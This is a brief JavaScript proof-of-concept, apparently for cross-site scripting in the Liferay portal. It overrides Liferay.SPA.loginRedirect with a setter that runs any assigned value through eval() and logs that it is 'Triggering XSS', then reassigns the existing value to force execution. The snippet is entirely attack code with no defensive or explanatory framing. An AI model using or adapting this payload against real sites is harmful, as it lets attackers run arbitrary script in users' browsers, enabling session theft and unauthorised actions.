// Define an auto-triggering setter on Liferay.SPA.loginRedirect
Object.defineProperty(Liferay.SPA, 'loginRedirect', {
  set: function(v) {
    console.log('[+] Triggering XSS from loginRedirect setter...');
    eval(v);
  },
  get: function() {
    return '';
  },
  configurable: true
});

// Re-assign value to trigger the setter (if the value was set before this script ran, this won't work)
if (Liferay.SPA.loginRedirect) {
  const val = Liferay.SPA.loginRedirect;
  Liferay.SPA.loginRedirect = val; // force setter to fire
}
